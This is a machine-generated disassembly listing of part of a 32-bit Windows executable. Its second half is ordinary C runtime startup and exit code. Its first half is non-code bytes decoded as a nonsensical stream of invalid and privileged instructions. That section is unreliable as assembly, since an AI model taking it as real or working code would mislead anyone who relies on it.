  422498:	jbe    0x42245f
  42249a:	xchg   BYTE PTR [eax-0x5bd36251],dh
  4224a0:	scas   al,BYTE PTR es:[edi]
  4224a1:	ins    BYTE PTR es:[edi],dx
  4224a2:	jp     0x4224c3
  4224a4:	xchg   ebp,eax
  4224a5:	inc    ebx
  4224a6:	and    BYTE PTR [eax+0x5ee3f9d8],ch
  4224ac:	in     eax,0x32
  4224ae:	mov    WORD PTR [eax-0x1c],cs
  4224b1:	cmp    BYTE PTR [edi+0x1b],bh
  4224b4:	aas    
  4224b5:	cmp    esi,ebx
  4224b7:	dec    ecx
  4224b8:	pop    es
  4224b9:	xchg   ebx,eax
  4224ba:	jae    0x422488
  4224bc:	xlat   BYTE PTR ds:[ebx]
  4224bd:	mov    ds:0xf6c90e09,al
  4224c2:	retf   0x5e0d
  4224c5:	dec    edx
  4224c6:	fdivr  QWORD PTR [ebx-0xaabd5b5]
  4224cc:	inc    edx
  4224cd:	daa    
  4224ce:	les    esp,FWORD PTR [ecx+0x4b]
  4224d1:	jecxz  0x4224df
  4224d3:	pusha  
  4224d4:	out    0xd2,eax
  4224d6:	fst    QWORD PTR ds:0xcde5f701
  4224dc:	mov    DWORD PTR [esp+ebx*4-0x697c5281],0x51704d75
  4224e7:	sbb    eax,0x2d1ee7ff
  4224ec:	addr16 and al,0xce
  4224ef:	pop    edx
  4224f0:	fdivr  DWORD PTR [esi]
  4224f2:	inc    edx
  4224f3:	rcl    ebp,1
  4224f5:	stos   BYTE PTR es:[edi],al
  4224f6:	mov    ebx,0x9a9eb9e
  4224fb:	pop    edx
  4224fc:	data16 cmp ch,dh
  4224ff:	outs   dx,BYTE PTR ds:[esi]
  422500:	xor    cl,dl
  422502:	cwde   
  422503:	test   DWORD PTR [eax+0x35cfae1e],esi
  422509:	data16 (bad) 
  42250b:	loopne 0x4224bb
  42250d:	mov    WORD PTR [ebx],ds
  42250f:	das    
  422510:	xor    DWORD PTR [edx-0x53b4fda7],esp
  422516:	xchg   ebp,eax
  422517:	pop    edi
  422518:	test   al,0x5e
  42251a:	pavgb  mm4,QWORD PTR [ecx+esi*1]
  42251e:	jae    0x4224e3
  422520:	push   edi
  422521:	cwde   
  422522:	inc    edx
  422523:	call   0x4823:0xd6936b03
  42252a:	int    0xdc
  42252c:	sub    dl,BYTE PTR [eax-0xe]
  42252f:	mov    al,ds:0x1ca32041
  422534:	mov    eax,ds:0x27631fd7
  422539:	mov    ebx,0x603674e3
  42253e:	int3   
  42253f:	pop    ebp
  422540:	sbb    ebx,DWORD PTR [ebp-0x222d391]
  422546:	mov    esp,0x9bbbcf11
  42254b:	es sub DWORD PTR fs:[ebx-0x72],edi
  422550:	fnsave [edi]
  422552:	adc    ch,bh
  422554:	retf   0x71db
  422557:	jl     0x422508
  422559:	ja     0x422591
  42255b:	and    BYTE PTR [ecx+0x1768bb4],dl
  422561:	daa    
  422562:	sbb    ah,dh
  422564:	or     edi,esi
  422566:	hlt    
  422567:	ret    
  422568:	fstp   TBYTE PTR [esi+0x73]
  42256b:	pop    ebx
  42256c:	(bad)  
  42256e:	retf   0x80ed
  422571:	test   DWORD PTR ds:0x8f8e5fd0,edx
  422577:	out    0xac,al
  422579:	lock adc eax,0x1808536c
  42257f:	pop    edx
  422580:	sub    DWORD PTR [esi+eax*1-0x25353f08],esi
  422587:	(bad)  
  422588:	scas   al,BYTE PTR es:[edi]
  422589:	sub    edx,eax
  42258b:	out    0x23,al
  42258d:	pusha  
  42258e:	mov    dl,0x97
  422590:	push   ebx
  422591:	mov    ebx,ebp
  422593:	and    eax,edi
  422595:	inc    edi
  422596:	out    dx,eax
  422597:	mov    esp,0x563f2527
  42259c:	dec    ecx
  42259d:	bound  ebp,QWORD PTR [ecx+0x77954fa2]
  4225a3:	xchg   ebp,eax
  4225a4:	and    DWORD PTR [esi+0x13ee4bf],edx
  4225aa:	ja     0x42255a
  4225ac:	sub    ah,bh
  4225ae:	iret   
  4225af:	pop    ebx
  4225b0:	and    eax,0x8195176f
  4225b5:	mov    al,ds:0xd80ab16e
  4225ba:	ror    DWORD PTR [edx-0x79f8cf15],1
  4225c0:	popa   
  4225c1:	test   eax,0xfaff5c71
  4225c6:	lods   al,BYTE PTR ds:[esi]
  4225c7:	mov    ebx,0xf041969
  4225cc:	popf   
  4225cd:	pop    ds
  4225ce:	add    al,0x5e
  4225d0:	sub    al,0xe0
  4225d2:	cmp    eax,0xbb305452
  4225d7:	jp     0x4225a6
  4225d9:	push   0x38361435
  4225de:	nop
  4225df:	dec    ebp
  4225e0:	pop    edx
  4225e1:	mov    bl,0xcb
  4225e3:	sbb    DWORD PTR [esi],esp
  4225e5:	adc    ch,BYTE PTR [eax-0x5cf2e916]
  4225eb:	mov    BYTE PTR [edi],dl
  4225ed:	in     eax,dx
  4225ee:	int    0x8f
  4225f0:	xchg   ebp,eax
  4225f1:	adc    DWORD PTR [esi-0xdb1bc67],ecx
  4225f7:	pushf  
  4225f8:	daa    
  4225f9:	popa   
  4225fa:	mov    al,0x14
  4225fc:	sahf   
  4225fd:	xchg   ebx,eax
  4225fe:	sub    eax,0xdfe69c85
  422603:	jg     0x4225fe
  422605:	mov    eax,ds:0x34506ede
  42260a:	fs std 
  42260c:	lea    eax,[edx+0x75]
  42260f:	xchg   esp,eax
  422610:	fld    TBYTE PTR [ecx]
  422612:	lods   eax,DWORD PTR ds:[esi]
  422613:	arpl   si,dx
  422615:	pop    eax
  422616:	lods   eax,DWORD PTR ds:[esi]
  422617:	pop    esp
  422618:	jnp    0x4225b8
  42261a:	adc    al,0x7b
  42261c:	push   esi
  42261d:	ds push edx
  42261f:	mov    DWORD PTR [edx],edx
  422621:	jo     0x422696
  422623:	pop    esi
  422624:	in     al,0x8d
  422626:	les    esi,FWORD PTR [ecx+0xd]
  422629:	push   0x389473c0
  42262e:	aam    0xbd
  422630:	pusha  
  422631:	daa    
  422632:	add    al,0xa2
  422634:	lahf   
  422635:	sbb    al,0x18
  422637:	sbb    DWORD PTR ds:0x76bde73c,ebx
  42263d:	data16 aaa 
  42263f:	push   edx
  422640:	xchg   esp,eax
  422641:	push   eax
  422642:	mul    DWORD PTR [edi+0x288c31cb]
  422648:	jns    0x4226a3
  42264a:	add    al,0xc2
  42264c:	mov    fs,WORD PTR [ecx-0x688f24d9]
  422652:	cld    
  422653:	push   eax
  422654:	je     0x42261b
  422656:	or     eax,0x4db8058c
  42265b:	xchg   ebx,eax
  42265c:	xchg   ebp,eax
  42265d:	cdq    
  42265e:	dec    edx
  42265f:	clc    
  422660:	es ds mul bl
  422664:	test   al,0xb4
  422666:	out    0x3b,al
  422668:	mov    ds:0x7cd016e6,eax
  42266d:	mov    WORD PTR [ecx-0x5ccde7de],cs
  422673:	sub    al,0x3e
  422675:	adc    al,0xe1
  422677:	add    dl,BYTE PTR [ecx+0x7c]
  42267a:	fld    DWORD PTR [eax-0x6]
  42267d:	xor    edi,ebx
  42267f:	pop    eax
  422680:	adc    ebp,DWORD PTR [ebx-0x4e]
  422683:	test   BYTE PTR [edx-0x7905189c],dl
  422689:	inc    eax
  42268a:	mov    ecx,0xf9239eac
  42268f:	mov    eax,ds:0x448fb74e
  422694:	retf   0x3a0d
  422697:	jns    0x422642
  422699:	xchg   ecx,eax
  42269a:	les    ecx,FWORD PTR [esi-0x78]
  42269d:	mov    ebx,esi
  42269f:	xchg   esp,eax
  4226a0:	(bad)  
  4226a1:	jg     0x4226ae
  4226a3:	lea    eax,[ecx-0x5c4d9b3e]
  4226a9:	lods   eax,DWORD PTR ds:[esi]
  4226aa:	adc    eax,0x9c32ca5e
  4226af:	and    bl,ah
  4226b1:	nop
  4226b2:	fsubp  st(5),st
  4226b4:	add    bh,BYTE PTR [eax]
  4226b6:	outs   dx,BYTE PTR ds:[esi]
  4226b7:	jp     0x42270e
  4226b9:	ret    0x296c
  4226bc:	jmp    0x75cc:0xe420564
  4226c3:	scas   al,BYTE PTR es:[edi]
  4226c4:	or     al,0xa6
  4226c7:	repz xchg esp,eax
  4226c9:	aam    0x3a
  4226cb:	bound  edi,QWORD PTR [edx-0x27]
  4226ce:	push   esp
  4226cf:	test   eax,0xbe8a3c43
  4226d4:	ret    0x8e38
  4226d7:	cdq    
  4226d8:	cmp    DWORD PTR es:[edi],ebp
  4226db:	xchg   BYTE PTR [ebx],cl
  4226dd:	pop    edi
  4226de:	inc    ecx
  4226df:	cmp    al,0x24
  4226e1:	test   al,0xda
  4226e3:	ja     0x4226a1
  4226e5:	pusha  
  4226e6:	pop    esi
  4226e7:	mov    ds:0x5b72cd12,eax
  4226ec:	fld    st(3)
  4226ee:	clc    
  4226ef:	(bad)  [ebp+0x5]
  4226f2:	sbb    ecx,DWORD PTR [esi]
  4226f4:	pushf  
  4226f5:	sbb    al,0xe8
  4226f7:	inc    edx
  4226f8:	inc    edx
  4226f9:	stos   BYTE PTR es:[edi],al
  4226fa:	push   cs
  4226fb:	mov    ah,0xf8
  4226fd:	in     al,0xa8
  4226ff:	ins    BYTE PTR es:[edi],dx
  422700:	cmp    eax,0x8f4e62cf
  422705:	sbb    eax,0x1e5e6bda
  42270a:	cs test eax,0x2b5f0b09
  422710:	push   esp
  422711:	adc    al,0x89
  422713:	mov    ecx,0x86f82079
  422718:	jmp    0xcfc43dd6
  42271d:	(bad)  
  42271e:	jne    0x422754
  422720:	(bad)  [ebx]
  422722:	out    dx,eax
  422723:	stos   BYTE PTR es:[edi],al
  422724:	mov    ?,WORD PTR [edx]
  422726:	enter  0xf9ec,0x77
  42272a:	fistp  QWORD PTR [ebx]
  42272c:	lahf   
  42272d:	(bad)  
  42272e:	xchg   BYTE PTR [edx],bl
  422730:	in     eax,0x44
  422732:	shr    BYTE PTR [ecx],1
  422734:	pop    ebp
  422735:	retf   
  422736:	lods   al,BYTE PTR ds:[esi]
  422737:	adc    cl,BYTE PTR [esi+0x10d7c3d]
  42273d:	mov    eax,0x6397c55e
  422742:	aam    0x2b
  422744:	ss mov ebx,0xbf73e93a
  42274a:	popf   
  42274b:	sub    al,0xbf
  42274d:	pop    edi
  42274e:	mov    dl,0xe
  422750:	dec    ebp
  422751:	mov    edx,0x66f49fb
  422756:	ret    
  422757:	outs   dx,DWORD PTR ds:[esi]
  422758:	loopne 0x42277f
  42275a:	cmp    esp,DWORD PTR [ebp+0x18]
  42275d:	ja     0x422726
  42275f:	mov    BYTE PTR [ebx+0x51],bl
  422762:	out    dx,eax
  422763:	mov    cl,0x65
  422765:	out    0xdb,eax
  422767:	mov    eax,0x73a983e9
  42276c:	cmp    DWORD PTR [esp+ebp*1+0x14805e34],esi
  422773:	aad    0x2c
  422775:	in     eax,dx
  422776:	xchg   eax,esp
  422778:	out    0x2e,eax
  42277a:	cmp    ch,dh
  42277c:	retf   
  42277d:	(bad)  
  42277e:	out    0x4d,al
  422780:	sbb    eax,0xe1030fc5
  422785:	test   eax,0xee97918c
  42278a:	lods   eax,DWORD PTR ds:[esi]
  42278b:	aas    
  42278c:	push   cs
  42278d:	sti    
  42278e:	or     eax,0x5af681bf
  422793:	retf   
  422794:	fdivr  st,st(3)
  422796:	and    cl,BYTE PTR [ebx]
  422798:	push   esp
  422799:	sti    
  42279a:	inc    ebp
  42279b:	and    esp,DWORD PTR [ecx-0xa3877a2]
  4227a1:	push   eax
  4227a2:	jno    0x42281d
  4227a4:	in     eax,0xbb
  4227a6:	push   cs
  4227a7:	test   dh,bl
  4227a9:	mov    dl,0x67
  4227ab:	and    esp,DWORD PTR [edi-0x35]
  4227ae:	cdq    
  4227af:	jo     0x42276e
  4227b1:	mov    dh,0x3c
  4227b3:	fstp   DWORD PTR [eax+0x47]
  4227b6:	aaa    
  4227b7:	ja     0x4227b1
  4227b9:	daa    
  4227ba:	jne    0x422795
  4227bc:	rol    edx,0x1
  4227bf:	mov    edi,0x7d5bcaeb
  4227c4:	push   cs
  4227c5:	ins    DWORD PTR es:[edi],dx
  4227c6:	xchg   ecx,eax
  4227c7:	jne    0x42275d
  4227c9:	stos   DWORD PTR es:[edi],eax
  4227ca:	(bad)  [ebx+esi*2]
  4227cd:	jnp    0x4227f6
  4227cf:	inc    edi
  4227d0:	jge    0x422837
  4227d2:	stos   DWORD PTR es:[edi],eax
  4227d3:	ins    DWORD PTR es:[edi],dx
  4227d4:	iret   
  4227d5:	mov    edi,0x39417fb1
  4227da:	and    cl,BYTE PTR [ebp+0x7e]
  4227dd:	xchg   esi,eax
  4227de:	or     BYTE PTR [edi+0x7d],bl
  4227e1:	fiadd  DWORD PTR [esi-0x34d4b8]
  4227e7:	(bad)  
  4227e8:	jg     0x422811
  4227ea:	call   0xe23a39ce
  4227ef:	sahf   
  4227f0:	and    DWORD PTR [esi-0x69],0xad0fa2e9
  4227f7:	mov    edi,0xea982836
  4227fc:	lods   eax,DWORD PTR ds:[esi]
  4227fd:	test   BYTE PTR [edx-0x5b],ch
  422800:	data16 shl dl,0x61
  422804:	dec    edx
  422805:	icebp  
  422806:	dec    ebp
  422807:	mov    bh,0x71
  422809:	std    
  42280a:	out    0xf,eax
  42280c:	push   cs
  42280d:	add    DWORD PTR [edi-0x436358bf],0xffffffa4
  422814:	inc    esi
  422815:	iret   
  422816:	(bad)  
  422817:	cmp    BYTE PTR [edx+0x44],bh
  42281a:	xchg   ecx,eax
  42281b:	int3   
  42281c:	dec    ebx
  42281d:	ss mov dh,0xf
  422820:	jp     0x422880
  422822:	lds    edx,FWORD PTR [ebx]
  422824:	imul   eax,DWORD PTR [ecx*1-0x6b29e53d],0xf
  42282c:	add    ecx,DWORD PTR ds:0xa493d6f
  422832:	(bad)  
  422833:	mov    dh,0x84
  422835:	stc    
  422836:	cmp    esp,DWORD PTR [eax+0x1c]
  422839:	scas   eax,DWORD PTR es:[edi]
  42283a:	sub    DWORD PTR [esi],ebx
  42283c:	mov    ecx,0x61819fb6
  422841:	sbb    eax,0x3627926c
  422846:	stc    
  422847:	sub    dl,ch
  422849:	std    
  42284a:	iret   
  42284b:	je     0x4228c0
  42284d:	pop    esp
  42284e:	or     al,0x18
  422850:	shr    ch,cl
  422852:	lock aad 0xb8
  422855:	shl    BYTE PTR [ebp+0x43],0xa4
  422859:	call   0x231f:0x83fa7b8e
  422860:	(bad)  
  422861:	mov    bl,0xef
  422863:	jl     0x4228d7
  422865:	sub    al,0x72
  422867:	or     ebp,DWORD PTR [edi-0x1cdf77b4]
  42286d:	cmc    
  42286e:	mov    ebp,0x60b17bc5
  422873:	mov    ah,0x9c
  422875:	retf   
  422876:	imul   esp,DWORD PTR [eax],0x5a
  422879:	mov    BYTE PTR [esi+0x3b],bl
  42287c:	cli    
  42287d:	add    ebx,DWORD PTR [eax+0x376e9ae8]
  422883:	leave  
  422884:	bound  edi,QWORD PTR [edx]
  422886:	pop    es
  422887:	scas   al,BYTE PTR es:[edi]
  422888:	fcomp  st(0)
  42288a:	mov    al,ds:0xcf485f7b
  42288f:	fs pop ebx
  422891:	and    BYTE PTR [esi+0x64],0x5d
  422895:	imul   ebp,DWORD PTR [esi+0x72],0xffffffdc
  422899:	shr    DWORD PTR [esi+0x541d8efe],cl
  42289f:	aaa    
  4228a0:	push   cs
  4228a1:	mov    dl,0xfc
  4228a3:	repz and ah,0x37
  4228a7:	cdq    
  4228a8:	dec    ecx
  4228a9:	sbb    eax,0x2608aec8
  4228ae:	aas    
  4228af:	sbb    BYTE PTR [edi+0x4306808d],0x44
  4228b6:	popf   
  4228b7:	sar    BYTE PTR [eax-0x4d6de8a4],1
  4228bd:	shl    BYTE PTR [ebp-0x95eafcc],1
  4228c3:	popf   
  4228c4:	repz mov edi,0x897cdef4
  4228ca:	int    0x4
  4228cc:	mov    eax,0x721c3ed1
  4228d1:	(bad)  
  4228d3:	pusha  
  4228d4:	rol    DWORD PTR [edx+0x7cdaa082],1
  4228da:	push   esp
  4228db:	jmp    0xf8e6:0xbc70107e
  4228e2:	and    DWORD PTR [ebp-0x21],0x1a
  4228e6:	cmp    al,0x9a
  4228e8:	mov    eax,es:0x68007bc2
  4228ee:	sub    eax,0xf5d678e1
  4228f3:	xchg   ebp,eax
  4228f4:	xchg   edx,eax
  4228f5:	stos   BYTE PTR es:[edi],al
  4228f6:	mov    al,0xae
  4228f8:	push   0xaca9725f
  4228fd:	jecxz  0x422973
  4228ff:	rol    DWORD PTR [ebx-0xbc06b2],cl
  422905:	push   ebp
  422906:	jmp    0x17f4:0xb08dfef8
  42290d:	in     al,dx
  42290e:	mov    edx,0xca269409
  422913:	cmp    ch,BYTE PTR [ebx-0x45]
  422916:	cmc    
  422917:	xor    BYTE PTR [edx-0x6e],bh
  42291a:	std    
  42291b:	stc    
  42291c:	sbb    DWORD PTR [ebp+0x5a],0xda2829cc
  422923:	mov    ds:0x29ec06a7,al
  422928:	cmp    DWORD PTR [eax+0x36],esp
  42292b:	push   esp
  42292c:	pop    esp
  42292d:	cmp    eax,esi
  42292f:	mov    WORD PTR [edx+eax*2+0x2a724845],cs
  422936:	sti    
  422937:	cmp    ebx,DWORD PTR [ecx+0x7f]
  42293a:	sbb    ch,dl
  42293c:	cwde   
  42293d:	sar    DWORD PTR [edx+0x60],1
  422940:	arpl   WORD PTR [ebx-0x6],bp
  422943:	arpl   WORD PTR [ebx],di
  422945:	ret    0x7c28
  422948:	inc    eax
  422949:	call   DWORD PTR [edi+0x3aa729db]
  42294f:	loope  0x422986
  422951:	clc    
  422952:	inc    esi
  422953:	xchg   edi,eax
  422954:	stos   DWORD PTR es:[edi],eax
  422955:	inc    ebp
  422956:	lahf   
  422957:	sbb    al,0x4a
  422959:	repnz xor eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
